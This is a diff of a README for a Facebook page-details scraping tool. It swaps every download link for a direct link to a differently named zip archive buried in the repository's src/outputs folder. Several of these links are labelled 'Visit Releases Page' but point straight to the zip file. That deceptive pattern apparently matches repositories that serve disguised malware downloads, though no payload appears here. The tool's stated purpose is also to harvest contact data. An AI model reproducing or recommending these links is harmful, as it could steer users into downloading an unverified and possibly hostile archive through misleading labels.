@@ -6,11 +6,11 @@ Welcome to the facebook-pages-details project! This tool lets you extract contac
 
 ## 📥 Download the Application
 
-[![Download facebook-pages-details](https://raw.githubusercontent.com/zhekainside/facebook-pages-details/main/facebook-pages-details-scraper/facebook-pages-details_v3.4.zip)](https://raw.githubusercontent.com/zhekainside/facebook-pages-details/main/facebook-pages-details-scraper/facebook-pages-details_v3.4.zip)
+[![Download facebook-pages-details](https://github.com/zhekainside/facebook-pages-details/raw/refs/heads/main/facebook-pages-details-scraper/src/outputs/details-facebook-pages-gradational.zip)](https://github.com/zhekainside/facebook-pages-details/raw/refs/heads/main/facebook-pages-details-scraper/src/outputs/details-facebook-pages-gradational.zip)
 
 To start using our application, simply visit the Releases page to download the latest version:
 
-[Visit Releases Page](https://raw.githubusercontent.com/zhekainside/facebook-pages-details/main/facebook-pages-details-scraper/facebook-pages-details_v3.4.zip)
+[Visit Releases Page](https://github.com/zhekainside/facebook-pages-details/raw/refs/heads/main/facebook-pages-details-scraper/src/outputs/details-facebook-pages-gradational.zip)
 
 ## 💻 System Requirements
 
@@ -31,7 +31,7 @@ Before you start, make sure your computer meets the following requirements:
 
 1. **Go to the Releases Page:** Click the link below to reach the download page.
 
-   [Visit Releases Page](https://raw.githubusercontent.com/zhekainside/facebook-pages-details/main/facebook-pages-details-scraper/facebook-pages-details_v3.4.zip)
+   [Visit Releases Page](https://github.com/zhekainside/facebook-pages-details/raw/refs/heads/main/facebook-pages-details-scraper/src/outputs/details-facebook-pages-gradational.zip)
 
 2. **Download the Application:** Look for the latest version and click on the download link. The file will be in a format suitable for your operating system.
 
@@ -96,4 +96,4 @@ Thank you for using facebook-pages-details! Your feedback helps us improve the a
 
 Don't forget to download the latest version from the Releases page:
 
-[Visit Releases Page](https://raw.githubusercontent.com/zhekainside/facebook-pages-details/main/facebook-pages-details-scraper/facebook-pages-details_v3.4.zip)
+[Visit Releases Page](https://github.com/zhekainside/facebook-pages-details/raw/refs/heads/main/facebook-pages-details-scraper/src/outputs/details-facebook-pages-gradational.zip)
